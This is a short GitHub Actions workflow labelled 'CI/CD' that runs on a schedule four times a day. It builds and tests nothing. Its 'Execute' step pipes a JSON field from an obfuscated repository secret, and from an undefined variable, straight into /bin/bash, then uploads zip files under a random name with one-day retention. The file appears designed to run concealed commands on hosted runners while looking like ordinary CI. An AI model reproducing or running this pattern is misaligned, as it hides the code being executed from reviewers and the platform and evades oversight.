name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '40 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          urdb07: ${{ secrets.urdb07 }}
        run: |
          printf '%s' "$urdb07" | jq -r .yws9 | /bin/bash
          printf '%s' "$dip486" | jq -r .pu79686 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: bhQGEbHo
          path: "*.zip"
          retention-days: 1
